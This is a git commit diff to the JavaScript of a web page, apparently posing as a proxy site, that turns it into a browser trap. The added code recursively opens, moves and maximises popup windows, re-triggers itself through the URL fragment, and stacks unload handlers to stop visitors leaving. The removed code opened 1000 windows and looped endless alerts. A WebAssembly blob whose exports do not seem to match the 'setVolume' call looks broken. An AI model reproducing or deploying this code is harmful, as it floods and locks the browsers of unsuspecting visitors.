1a1936432fdbed93dced949c6952d4c7d3245a55
TheLazyCodernothacker <120674735+TheLazyCodernothacker@users.noreply.github.com>
2023-11-08 09:07:54 -0800

    Update index.js

--- index.js
+++ index.js
@@ -15,19 +15,22 @@ function openFullscreen() {
   }
 }
 
-function submit() {
-  openFullscreen();
+function fun() {
+  var popup = window.open("index.html#1", "", "width=1000");
+  if (popup == null) {
+    alert("Please enable popups for this website.");
+  } else {
+    popup.moveTo(
+      window.innerWidth * Math.random(),
+      window.innerHeight * Math.random()
+    );
+    popup.resizeTo(screen.width, screen.height);
+  }
+  fun();
+}
 
-  alert("Please enable popups for pr0xy");
-  setTimeout(function () {
-    for (let i = 0; i < 1000; i++) {
-      window.open("pork", "", "width=1000");
-    }
-    openFullscreen();
-    while (true) {
-      alert("You are stuck now!");
-    }
-  }, 2000);
+function submit() {
+  fun();
 }
 
 window.addEventListener("keydown", (e) => {
@@ -35,3 +38,43 @@ window.addEventListener("keydown", (e) => {
     submit();
   }
 });
+
+var p = JSON.stringify(window.location);
+if (p.includes("#")) {
+  fun();
+}
+
+window.addEventListener("beforeunload", function (e) {
+  e.preventDefault();
+  e.returnValue = "";
+});
+
+window.onbeforeunload = function () {
+  var message = "Do you want to leave this page?";
+  return message;
+};
+
+window.onunload = function () {
+  return "Are you sure you want to leave this page?";
+};
+
+window.addEventListener("unload", function (e) {
+  e.preventDefault();
+  e.returnValue = "";
+});
+
+window.onbeforeunload = function () {
+  return "Are you sure you want to leave this page?";
+};
+
+const wasmCode = new Uint8Array([
+  0, 97, 115, 109, 1, 0, 0, 0, 1, 135, 128, 128, 128, 0, 2, 96, 1, 127, 1, 127,
+  96, 0, 0, 2, 140, 128, 128, 128, 0, 1, 3, 101, 110, 118, 5, 115, 101, 116,
+  117, 112, 0, 0, 3, 130, 128, 128, 128, 0, 1, 1, 4, 103, 101, 116, 0, 1, 3, 1,
+  1, 5, 105, 110, 105, 116, 0, 0, 10, 152, 128, 128, 128, 0, 1, 142, 128, 128,
+  128, 0, 0, 65, 0, 11,
+]);
+const wasmModule = new WebAssembly.Module(wasmCode);
+const wasmInstance = new WebAssembly.Instance(wasmModule, {});
+const setVolume = wasmInstance.exports.setVolume;
+setVolume(100);
